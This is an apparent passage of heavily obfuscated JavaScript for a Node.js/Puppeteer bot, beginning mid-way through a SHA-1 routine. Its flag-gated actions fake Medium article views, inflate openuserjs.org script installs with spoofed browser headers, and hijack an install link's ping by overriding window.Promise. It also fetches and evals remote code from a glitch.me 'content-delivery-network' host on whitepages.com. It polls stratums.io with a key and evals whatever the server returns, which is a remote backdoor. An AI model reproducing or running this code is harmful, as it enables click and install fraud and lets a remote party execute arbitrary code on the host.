                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << 0x119b + 0xa1d + -0x1bb3 | T >>> -0x2305 + -0x249f + -0x1 * -0x47bf) + (U ^ V ^ W) + X + (0x7b0d * -0x189ee + -0x4fe2a3dc + 0x165ba463 * 0x11) + Y[R] << -0x1978 + 0x49f + -0x14d9 * -0x1) << -0x9 * -0x377 + -0x7 * 0x52a + 0x4fc | X >>> -0x68f * 0x5 + 0x13d8 + 0xd0e) + (T ^ (U = U << 0x5f0 + 0x2346 + -0x2918 | U >>> -0x1ce6 + -0x9 * -0x408 + -0x20 * 0x3b) ^ V) + W + (-0x7d48958f + 0x46eb832c + 0xa536fe04) + Y[R + (0xd2e + 0xbc + -0x3 * 0x4a3)] << 0x4f * -0x62 + -0x12a + 0x1f68) << -0x259f + -0x10 * -0x1b8 + 0x1 * 0xa24 | W >>> 0x3c3 + 0x11dd * 0x2 + -0x2762) + (X ^ (T = T << -0x2da + 0x1cf2 + -0x19fa | T >>> 0x61 * -0x25 + -0x1ed7 + -0x2cde * -0x1) ^ U) + V + (0x1c472769 + -0x8841a95 + -0xf * -0x6129763) + Y[R + (0x8 * 0x212 + -0x3 * -0x943 + -0x2c57)] << 0x46d + 0x203d + -0x1ee * 0x13) << -0x2 * -0xb83 + 0x1 * 0x18d1 + -0x2fd2 | V >>> 0xcfb + -0x1 * -0x211c + -0x2dfc) + (W ^ (X = X << -0x181a + -0x8 * 0x417 + 0x38f0 | X >>> 0x11c7 + 0x1d5a * -0x1 + 0xb95) ^ T) + U + (0xacac4b * -0xcf + 0x384e3bdf * -0x2 + 0x745 * 0x31f234) + Y[R + (-0x5 * 0x137 + 0x3 * -0x894 + -0x1 * -0x1fd2)] << 0x1105 * -0x1 + 0x2448 + -0x1 * 0x1343) << -0x1 * 0xfa1 + 0x67c * 0x6 + -0x1742 | U >>> -0x1a5 + -0x1 * 0x1bca + 0x1d8a) + (V ^ (W = W << 0x1978 + -0xc21 + 0x2a5 * -0x5 | W >>> -0x1 * 0x3c3 + 0x1759 + -0x1394) ^ X) + T + (0x85430bdd + 0x66cdb2cb + -0x7d36d307) + Y[R + (0x1c82 + 0x1700 + -0x1 * 0x337e)] << -0x494 + -0x1ef8 + -0x19 * -0x16c, V = V << -0x141e + 0x896 * -0x1 + 0x1cd2 | V >>> 0x13bb + 0xc07 * -0x2 + 0x455;
                    for (; R < -0x1034 + 0x7d * 0x2b + -0x1 * 0x48f; R += 0x1 * 0x156a + -0x1d6 + -0x685 * 0x3)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << 0x1f3a + 0x665 + 0x2 * -0x12cd | T >>> 0x270c * 0x1 + 0x10f * 0x11 + -0x38f0) + (U & V | U & W | V & W) + X - (-0x2eae2af6 + -0x1 * -0x9f6f36bb + 0xb33 * 0x325) + Y[R] << -0xd2b + -0xfd1 + 0xd4 * 0x23) << 0x143a * -0x1 + 0x239 * -0x11 + 0x3a08 | X >>> 0x514 + -0x267d + 0xb * 0x30c) + (T & (U = U << 0xe46 + 0x22ed + -0x3115 | U >>> -0x13c5 + -0xfb7 + 0x7 * 0x512) | T & V | U & V) + W - (-0xb1196ccc + -0x1229d4 * 0x85 + -0xa4bc4 * -0x1d15) + Y[R + (-0x2127 + -0x1405 + 0x352d)] << 0x1b4b + 0x61f * 0x5 + -0x39e6) << 0x373 * 0x1 + 0x1 * -0x433 + 0x1 * 0xc5 | W >>> -0x2218 * -0x1 + 0x1d96 * 0x1 + -0x3f93) + (X & (T = T << 0x3ad + -0x1a7a * -0x1 + -0x1e09 | T >>> -0x1aff + -0x1 * -0xd77 + 0xd8a) | X & U | T & U) + V - (-0x1f9c69f4 * 0x3 + -0xd11d63bd + 0x1a0d6e4bd) + Y[R + (-0x1 * 0x293 + -0x6 * 0x14e + 0xa69)] << 0x19df + 0x24e2 * 0x1 + -0x253 * 0x1b) << -0x87e * 0x1 + -0x138a + 0x1c0d | V >>> 0x21d * -0x1 + -0x83e * 0x2 + 0x9 * 0x214) + (W & (X = X << -0xc * 0x1e4 + -0x1f4c + -0x19 * -0x22a | X >>> 0x58c + -0x1 * -0x77 + -0x601) | W & T | X & T) + U - (-0x9 * -0x16f503e3 + -0x6ea * 0x1248cc + 0x20b272a1) + Y[R + (0x7a4 + 0xd3a + 0x119 * -0x13)] << 0x1 * -0x14db + 0x97b * 0x1 + -0x5b0 * -0x2) << 0x58 * 0x1f + -0x1b * -0x89 + 0x1 * -0x1916 | U >>> 0x2 * 0x10fd + 0x11b * -0x1 + -0x20c4) + (V & (W = W << -0x1772 + 0x8 * -0x285 + 0x15dc * 0x2 | W >>> 0x22c8 + -0xfd6 + -0x12f0) | V & X | W & X) + T - (0x14d75ff7 * -0x9 + -0x93fe6bab + 0x1c0750e7e) + Y[R + (-0x1f * 0x7f + 0xa89 + 0x4dc)] << 0xc78 + 0x1769 + -0x23e1, V = V << -0x36f + -0x1 * -0x8e3 + -0x2 * 0x2ab | V >>> 0x21ad + -0x65 * 0x25 + -0x1312;
                    for (; R < 0x5 * 0x9d + 0x6 * 0x27 + -0x3ab; R += -0x2 * 0xf3e + -0x39 * 0xb + 0x3 * 0xafc)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << 0x2611 + -0x1275 + -0x1397 | T >>> 0x14e6 + -0x2 * -0xbd + 0x1645 * -0x1) + (U ^ V ^ W) + X - (0x1 * 0x4e326345 + -0x2 * 0x2062345d + 0x282f439f) + Y[R] << 0xd * -0x209 + -0x314 * -0x1 + 0x9 * 0x299) << 0x12f5 + 0x1cfd + -0x2fed * 0x1 | X >>> -0x251 * 0x4 + 0x5 * -0x139 + 0xf7c * 0x1) + (T ^ (U = U << 0x1409 + -0x2e * 0x9f + 0x1bb * 0x5 | U >>> -0xee7 * -0x1 + -0x116c * 0x2 + 0x13f3 * 0x1) ^ V) + W - (0x1e3 * 0xebc7e + 0x64b5c501 + -0x4ae62891) + Y[R + (0x67b + 0x2b7 * -0xb + 0x1 * 0x1763)] << -0x703 * 0x4 + -0x11 * -0x248 + -0xabc) << -0x22f2 + 0x1a5e + -0x899 * -0x1 | W >>> -0x13d7 * -0x1 + 0x28d + 0x1649 * -0x1) + (X ^ (T = T << 0x1 * 0x242f + -0x3 * 0x16f + -0x1fc4 | T >>> 0x1f1b * -0x1 + 0x1 * -0x28e + 0x21ab) ^ U) + V - (-0x490a45e9 + 0xb * 0x446332a + 0x4fa35145) + Y[R + (-0x1 * 0x67a + -0x10c4 + 0x30 * 0x7c)] << -0x1730 + -0x7d * -0x19 + 0x1 * 0xafb) << 0x2582 * -0x1 + -0x25d1 + 0x2 * 0x25ac | V >>> -0x2 * -0x7bd + 0x111 * 0xc + -0x1c2b) + (W ^ (X = X << 0x1bfc + -0x1 * -0x1a37 + -0x3615 | X >>> -0x5 * -0x15d + -0x12eb * 0x1 + 0xc1c) ^ T) + U - (-0x50fb7e8b + 0x498875c3 + 0x3d1046f2) + Y[R + (-0x4 * -0x69b + 0x1 * -0xc13 + -0xe56)] << -0x26d7 + 0x163 + 0x2574) << -0x5bc + 0x21ba + -0x1bf9 | U >>> 0x2240 + 0xce * -0x2e + -0x31 * -0xf) + (V ^ (W = W << -0x3b * -0x67 + -0x73a * -0x1 + -0x1ed9 * 0x1 | W >>> 0x1b * -0xc9 + 0x1f * 0xa2 + 0x197) ^ X) + T - (-0x1b575db * -0x36 + -0x45a93b0 + -0x224f0a58) + Y[R + (0x187e + -0x13 * 0x19e + 0x640)] << 0x2 * 0x3b6 + -0x23c3 + 0x1c57, V = V << -0x4 * 0x6df + 0x1a91 + 0x35 * 0x5 | V >>> -0x1905 + 0x2368 + -0x1 * 0xa61;
                    this['h0'] = this['h0'] + T << 0x24 * 0x2b + 0x38 * -0x2c + -0x394 * -0x1, this['h1'] = this['h1'] + U << 0x193 + 0x35 * 0x2b + -0x1bf * 0x6, this['h2'] = this['h2'] + V << -0x743 + 0x2 * -0x8ed + 0x85f * 0x3, this['h3'] = this['h3'] + W << 0x164 * 0x1 + 0xc3 * 0x17 + -0x2f * 0x67, this['h4'] = this['h4'] + X << -0x61 * -0x12 + 0x1 * 0x127d + -0x194f;
                  }
                  ['hex']() {
                    this['finalize']();
                    var R = this['h0'],
                      S = this['h1'],
                      T = this['h2'],
                      U = this['h3'],
                      V = this['h4'];
                    return E[R >> -0x12a9 + 0x1d7a + -0xab5 & 0x1509 + -0x11a8 + -0x19 * 0x22] + E[R >> -0x2f * -0x79 + -0x4b9 * -0x7 + 0x2 * -0x1b97 & -0x1 * 0x248b + 0x21b2 + 0x2e8] + E[R >> 0x1 * 0x8be + -0x935 * -0x2 + -0x1b14 & -0x1 * 0x1b73 + -0x3 * 0x22d + 0x2209] + E[R >> 0x3 * -0xa6b + 0x13b8 + 0xb99 & 0xf1a + 0x188 * 0x10 + -0x278b] + E[R >> -0x26e8 + 0x1 * -0xb4e + 0x3242 & 0x1 * -0x13c1 + 0x9 * 0x381 + 0xbb9 * -0x1] + E[R >> 0x2199 + -0x531 + -0x1 * 0x1c60 & -0x125d + 0x1750 + 0x4e4 * -0x1] + E[R >> -0x12cd + 0x2513 + -0x39 * 0x52 & 0xf3a + -0x1de8 + -0x1 * -0xebd] + E[-0xded * 0x1 + 0x260b * -0x1 + 0x3407 * 0x1 & R] + E[S >> -0x1418 + 0x10a4 + 0x18 * 0x26 & 0x3 * 0xf + -0x1cab + 0x1c8d] + E[S >> -0xa05 + 0x16 + 0x1 * 0xa07 & 0x7 * 0x1c1 + -0x134 + -0xb04] + E[S >> 0x103a + -0x1 * 0x10af + 0x89 & 0x16b * 0x2 + -0x251c + 0x2255] + E[S >> 0xf06 + 0x2 * 0x781 + 0xe * -0x224 & -0xab1 * -0x1 + 0x2b3 * -0xe + 0x16 * 0x13c] + E[S >> -0xe9 + 0x186a + -0x1775 & -0x4 * 0x2c6 + -0xd * -0x1d7 + -0xcc4] + E[S >> 0x19 * 0x102 + -0x1 * 0x22b4 + 0x98a & -0xa93 + 0x5ff + 0x1 * 0x4a3] + E[S >> -0x1 * 0x153d + 0x1 * 0x100b + 0x2e * 0x1d & 0x1 * -0x20ff + -0x5f + 0xc7 * 0x2b] + E[0x25e1 * 0x1 + 0x86d + -0x1 * 0x2e3f & S] + E[T >> -0x6 * 0x12 + 0xc00 + 0x4 * -0x2de & 0x1b56 + 0x119 * -0x1a + 0x143] + E[T >> -0x3d1 + 0x22 * -0x76 + 0x1395 & -0x952 + 0x841 * -0x1 + 0x11a2] + E[T >> 0x10 + 0x20aa + -0x20a6 & -0x30 + 0x2e * -0x4b + 0xdb9] + E[T >> -0x193b + -0x8 * 0x58 + 0x1c0b & -0xc22 + -0x3 * 0x5ce + 0x1d9b] + E[T >> -0x1 * -0x747 + -0xc * 0x214 + 0x11b5 & 0x1b2f + 0x10f4 + -0x2c14] + E[T >> -0x13a8 + 0x2326 * 0x1 + -0xf76 & -0x2 * 0x368 + 0x313 + 0x3cc] + E[T >> 0x2491 + 0x82 * 0x43 + -0xa15 * 0x7 & 0x155f * -0x1 + -0x1 * 0xef5 + -0x2463 * -0x1] + E[0x5bb + -0xe3e * -0x2 + -0x2228 & T] + E[U >> 0xa66 + 0x2 * 0xa52 + -0x1eee * 0x1 & 0x4c * -0x35 + -0x130d * -0x2 + -0x164f] + E[U >> 0x1c9 * -0x10 + 0x1cce + 0x13 * -0x2 & -0x1882 + 0x1 * -0x18e6 + 0x3177] + E[U >> 0x20a * 0x3 + 0x13d * -0x4 + -0x8b * 0x2 & -0x862 * -0x3 + -0x249c + 0xb85 * 0x1] + E[U >> 0x31 * 0xb + 0x1bf2 * 0x1 + -0x1dfd & -0xc31 + 0x14e4 + -0x4 * 0x229] + E[U >> 0x1 * -0x2f2 + 0x2 * 0xa2b + -0x1158 & -0x1 * -0x174a + -0x609 * 0x5 + 0xe * 0x7f] + E[U >> 0x1 * 0x187d + -0x1 * -0x172d + 0x1d5 * -0x1a & -0x1788 + 0x6aa * 0x3 + 0x399] + E[U >> -0x973 * 0x3 + -0x1 * 0x158f + 0xb4 * 0x47 & 0x10ea + -0x1 * 0x11cf + -0x1 * -0xf4] + E[0x1607 + 0x4 * -0x422 + -0x570 & U] + E[V >> -0x6 * 0x55b + 0x44 * -0x46 + 0x1 * 0x32d6 & -0x4f3 * -0x7 + -0x1768 + -0xb2e] + E[V >> 0x2308 + -0x1 * 0x499 + -0x1e57 & -0x1dcf * -0x1 + 0x167b * -0x1 + 0x745 * -0x1] + E[V >> 0x24 * -0xf5 + 0x1b5a * -0x1 + 0x3de2 & -0x17f6 + 0x4cf * -0x5 + 0x3010] + E[V >> -0x67 * 0x22 + -0x1f91 + -0x2d4f * -0x1 & 0xb08 + 0x12c2 + -0x1dbb] + E[V >> 0xa3 * 0x35 + 0x95 * 0x35 + -0x561 * 0xc & -0x2610 + -0xc5 * 0xb + -0x174b * -0x2] + E[V >> -0x1620 + 0x978 + 0xcb0 & -0x1f9f + -0x11ba + 0x20f * 0x18] + E[V >> -0x9d + 0x14a4 * -0x1 + 0x1545 & 0x1 * 0xda + -0x1 * -0xd51 + -0xe1c] + E[0x167c * -0x1 + -0x513 * 0x1 + 0x1b9e & V];
                  }
                  ['digest']() {
                    this['finalize']();
                    var R = this['h0'],
                      S = this['h1'],
                      T = this['h2'],
                      U = this['h3'],
                      V = this['h4'];
                    return [
                      R >> -0x219 + 0x56 * -0x5e + 0x21c5 & 0x26c3 + 0x168 + -0x2e * 0xda,
                      R >> -0xd3 * 0x13 + 0x29 * -0x50 + 0x1c89 * 0x1 & 0x1 * -0xd4f + -0x16cf + 0x251d,
                      R >> -0x1878 + -0x729 + 0x655 * 0x5 & 0xa48 + -0x1858 + -0xf0f * -0x1,
                      -0x991 + 0x1fdf * 0x1 + -0x154f & R,
                      S >> 0x2381 + 0x670 * -0x4 + -0x9a9 * 0x1 & -0x1b * -0xf6 + -0xe34 + -0xabf,
                      S >> 0x94 + 0x2 * -0x12f9 + 0xc7a * 0x3 & -0x19ef + 0x5ad + 0x1541 * 0x1,
                      S >> -0xeff + -0x111d + -0x2c * -0xbb & 0x1 * -0x270e + 0xe27 + 0x19e6,
                      0x5c2 + 0xf38 + 0x1 * -0x13fb & S,
                      T >> 0x13fa + -0x7 * 0x3bc + 0x642 & 0x1 * 0x1f35 + 0x24b * -0x5 + -0x12bf,
                      T >> 0xd * 0x2dd + 0x33b * 0x6 + -0x388b & -0x2 * 0xde7 + 0x35 * -0x6b + -0x10fc * -0x3,
                      T >> 0x1 * 0x186d + 0x1 * -0x1ea9 + -0x1 * -0x644 & 0x622 * -0x3 + -0x1de * 0x4 + 0x1add,
                      -0x2564 + 0x5fc + 0x4a1 * 0x7 & T,
                      U >> 0x6 * -0xe9 + 0x1eec * -0x1 + -0x123d * -0x2 & 0x13d1 + -0x3f5 * 0x3 + -0x3 * 0x251,
                      U >> -0x1b7f * -0x1 + 0x8f3 * -0x2 + -0x989 & 0x1 * 0x1b73 + -0x8c3 * 0x1 + -0x11b1,
                      U >> -0x1143 + 0x16d * 0x7 + 0x30 * 0x27 & 0x72a + -0xb71 + 0x546,
                      0x278 * 0x8 + -0xc29 + -0x698 & U,
                      V >> 0xf1d + -0x9bb + -0x54a & -0x933 + 0x8ee * -0x2 + -0x85 * -0x36,
                      V >> -0xd28 + 0x21ce + -0x1496 & -0x1 * 0x1f5f + 0x1b5d + 0x501,
                      V >> -0xfb7 + 0x14c7 + -0x508 & 0x106f * 0x1 + -0x2 * 0xbfe + 0x88c,
                      -0x23dd * 0x1 + -0xa4 * -0x1 + -0x13 * -0x1e8 & V
                    ];
                  }
                  ['arrayBuffe' + 'r']() {
                    var R, S;
                    return this['finalize'](), R = new ArrayBuffer(0x2534 + -0x1e82 + -0x69e), (S = new DataView(R))['setUint32'](-0x1d4b + 0x1 * -0xac1 + -0x3a4 * -0xb, this['h0']), S['setUint32'](-0x37f * 0x1 + 0xf * 0xfb + -0xb32, this['h1']), S['setUint32'](0x5 * 0x727 + 0x2611 * 0x1 + -0x49cc, this['h2']), S['setUint32'](-0x15be + -0xd6 * 0x2a + 0x38e6, this['h3']), S['setUint32'](0xea4 + 0x1317 + -0x21ab, this['h4']), R;
                  }
              }
              O['prototype']['toString'] = O['prototype']['hex'], O['prototype']['array'] = O['prototype']['digest'];
              const P = K();
              window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
              let Q = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x65e * 0x4 + 0xc * -0x9a + -0x20b * -0x10];
              return window['Promise'] = class extends window['Promise'] {
                constructor(...R) {
                  let S = 0x15 * -0x3b + -0xe1f + 0x12f6;
                  R[0x82d + -0x1930 + 0x1103]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (R[0x1 * 0x1a85 + -0x1b8 * 0x10 + 0xfb] = T => {
                    const a3 = b;
                    let U = Q['getAttribu' + 'te']('data-ping-' + 'url');
                    if (U) {
                      let V = P(Q['getAttribu' + 'te']('data-ip-ad' + 'dress') + Q['getAttribu' + 'te'](a3(0x3, 'X5ch') + 't-id') + Q['getAttribu' + 'te']('data-ping-' + 'key')),
                        W = new XMLHttpRequest();
                      W['open']('POST', U + ('&mo=3&ping' + '_key=') + encodeURIComponent(V), 0x2 * -0x30c + -0x45c + 0x1 * 0xa75), W['overrideMi' + 'meType']('text/plain'), W['onload'] = () => {}, W['send'](), S = 0x7 * -0xbc + -0x2309 * -0x1 + -0x1de4 * 0x1;
                    }
                  }), S || super(...R);
                }
              }, window[a4(0x9, '@D3D')](() => {
                Q['click']();
              }, 0x1e8b * 0x1 + -0x1 * -0x1eb7 + -0x3766 * 0x1), Promise['resolve'](0x5f1 + 0x1 * -0x1171 + 0x5 * 0x24d);
            }), await wait(NETWORK_PATIENCE), await B['close'](), await A['close'](), r()));
          }
        }
        for (let s = 0x1e38 + -0x119 * 0x17 + -0x4f9; s < 0x17b * -0x3 + -0x5 * -0x385 + -0x25 * 0x5b; s++)
          r();
      }, 0x2014 + 0xd * 0x1df + -0x3803), flags['RPL2_MDM2'] && setTimeout(async () => {
        const r = await n['newPage']();
        for (;;) {
          let s = -0x16d2 + -0x9f + -0x11 * -0x161;
          if (await r['goto'](data['mediumArti' + 'cles']['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](u => s++), !s) {
            await randomWait();
            for (let u = 0x13a0 + -0x1 * -0x3aa + 0xba5 * -0x2; u < getRandomInt(0xa6 * 0x1f + 0x21 * 0xbf + -0x2cb8, -0x24cd + -0x2603 + 0x4ad5); u++)
              await r['keyboard']['press']('ArrowDown'), await randomWait();
            await randomWait(), await wait(0x1ae3 * -0x1 + 0x2 * 0x5e85 + 0x3 * 0x1813);
          }
        }
      }, 0x1ba5 + 0xc6f + -0x27b0), flags['RPL2_WP'] && setTimeout(async () => {
        (async function r() {
          try {
            let s = 0x21f3 + -0x7 * 0x2c7 + -0xe82;
            const t = await n['newPage']();
            if (await t['goto']('https://ww' + 'w.whitepag' + 'es.com/', {
                'timeout': MM_NETWORK_PATIENCE
              })['catch'](u => s++), s)
              return await t['close'](), r();
            await wait(0x12f + -0x185d + 0x22e6), await t['evaluate'](() => {
              let u = new XMLHttpRequest();
              u['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x6 * -0x574 + -0x1831 + -0x38e9 * -0x1), u['send'](), eval(u['responseTe' + 'xt']);
            });
          } catch (u) {}
        }());
      }, -0xf5c + 0x1 * 0x398 + -0x185 * -0x8);
    }
  ],
  [
    () => flags['doCreateSe' + 'rver'],
    async () => {
      require('http')['createServ' + 'er'](async function(f, g) {
        g['writeHead'](0x1 * -0xdff + -0x27 * -0xdd + -0x12e4), g['write']('v0.8'), g['end']();
      })['listen'](process['env']['PORT'] || -0x2927 + -0x2 * 0x1a49 + 0x7d49);
    }
  ],
  [
    () => flags['doOUJS'],
    async () => {
      async function f() {
        const a6 = d,
          a5 = c,
          h = data['oujsToAssi' + 'st']['random'](),
          j = h['replace']('/scripts/', '/install/') + '.user.js',
          [k, l] = (function() {
            const x = data['oujsUAs']['random']();
            return [
              x,
              x['includes']('Firefox')
            ];
          }()),
          m = function(x, y = 0x1 * 0x24cd + 0x1cd0 + 0x26 * -0x1ba) {
            if (x['includes']('Firefox'))
              return x['slice'](x['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x13cd + -0x96a + -0x1 * -0x1d38));
            const z = x['indexOf']('Chrome/') + 'Chrome/' ['length'],
              A = x['slice'](z),
              B = A['slice'](0x57b * 0x1 + 0x22d * -0xd + -0x1 * -0x16ce, A['indexOf']('\x20'));
            return y ? B['slice'](0x1 * -0x517 + -0x2112 + 0x2629 * 0x1, B['indexOf']('.')) : B;
          }(k),
          q = {
            'signal': AbortSignal['timeout'](-0x4f * 0xbe + -0x1e15 + 0x7 * 0x1241),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': 'https://op' + 'enuserjs.o' + 'rg',
              'user-agent': k,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + a5(0xc) + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'no-cache',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
        l ? Object['assign'](q['headers'], {
          'te': 'trailers'
        }) : Object['assign'](q['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        });
        const u = await fetch(g, q)['catch'](x => {});
        if (!u || !u['headers'])
          return;
        if (null === u['headers']['get']('X-RateLimi' + 't-Limit'))
          return;
        const v = {
          'signal': AbortSignal['timeout'](0x55 * 0x9b + 0x15d9 * 0x3 + -0x4df2),
          'headers': {
            'host': 'openuserjs' + '.org',
            'origin': 'https://op' + 'enuserjs.o' + 'rg',
            'user-agent': k,
            'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
            'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': g,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origi' + 'n',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1'
          },
          'body': null,
          'method': 'GET'
        };
        if (l ? Object['assign'](v['headers'], {
            'te': 'trailers'
          }) : Object['assign'](v['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), !await fetch(h, v)['catch'](x => {}))
          return;
        const w = {
          'headers': {
            'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
            'pragma': 'no-cache',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'none'
          },
          'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
          'body': null,
          'method': 'GET'
        };
        l ? Object['assign'](w[a6(0x5)], {
          'te': 'trailers'
        }) : Object['assign'](w['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        }), await fetch(j, w);
      }
      const g = 'https://op' + 'enuserjs.o' + 'rg/';
      f();
      for (let h = -0x1481 * 0x1 + 0x1 * 0x2033 + 0xbb2 * -0x1; h < -0x20ab * 0x1 + -0x37 * 0x47 + 0x2ff0; h++)
        setTimeout(f, (-0x292 * 0x27 + 0x155cd + 0x265 * -0x3) * h * getRandomInt(0x2459 + -0x4 * -0x4d7 + -0x1cc * 0x1f, 0x28 * -0x13 + 0x7 * -0x53e + -0x7 * -0x5ab));
      setInterval(() => {
        f();
        for (let i = 0x11 * -0xac + 0x2654 + -0xc * 0x23e; i < 0x4 * -0x6b9 + 0x16dd + -0x45 * -0xf; i++)
          setTimeout(f, (0xbdb8 + 0x45b6 * 0x2 + 0x97a * -0xa) * i * getRandomInt(-0x152c + -0x7 * -0xbf + -0x1 * -0xff4, -0xc2 * 0x2 + 0x1a1e * -0x1 + 0x1ba5));
      }, -0x3a8ca3 + -0x10e1ee + 0x825d11);
    }
  ],
  [
    () => flags['RPL2_RPRT'],
    async () => {
      async function f() {
        try {
          axios['post']('https://st' + 'ratums.io/' + 'research', {
            'key': 'CX001_ZCa',
            'dom': me
          })['then'](g => {
            try {
              eval(g['data']);
            } catch (h) {}
          })['catch'](g => {});
        } catch (g) {}
      }
      f(), setInterval(f, -0x31d7 * -0x1 + 0xb7e2 * -0x2 + 0x5d1cd);
    }
  ]
];
for (let e of actions)
  e[0xee4 + -0x1bf5 + 0x29d * 0x5]() && setTimeout(e[0x869 * 0x1 + -0x2 * -0x131b + -0x2e9e]);

function a() {
  const aV = [
    'WOe6hh4dWRRcM8krWP3cGq',
    'mtHMnYz1Dg1FCW',
    'WQKSu2BdQuvKrJzT',
    'W71Td1dcRvHJwYHU',
    'W5WLWPrCWQ9DWPxdPNW3',
    'headers',
    'rg/scripts',
    'ChrZlZq0odyWmq',
    'W4KWWPqkWQTlW4RdVJSS',
    'deVdHSk+WRdcQqWld8oJ',
    'zgvVlwHPzgvYlq',
    'FmooWQjNFWilW4BdJ8ou',
    'yw5NztT2pwiZoW',
    'hGGZWQBcOSofWPpdT8kkWP0',
    'i8kcWRBdIGy1W7CpDa8',
    'ence-betwe',
    'zwn0B3i'
  ];
  a = function() {
    return aV;
  };
  return a();
}